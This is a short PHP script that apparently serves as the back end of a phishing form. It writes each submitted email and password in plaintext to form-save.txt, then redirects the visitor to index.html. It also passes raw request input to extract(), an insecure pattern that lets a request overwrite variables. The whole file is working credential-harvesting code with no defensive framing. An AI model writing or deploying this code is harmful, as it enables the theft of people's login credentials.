<?php
 $aaaa ="*******************";
    extract($_REQUEST);
    $file=fopen("form-save.txt","a");

    fwrite($file,"Email :");
    fwrite($file, $email ."\n") ;
    fwrite($file,"Password :");
    fwrite($file, $password  ."\n");
    fwrite($file, $aaaa ."\n");
    fclose($file);
    header("location: index.html");
    
 ?>
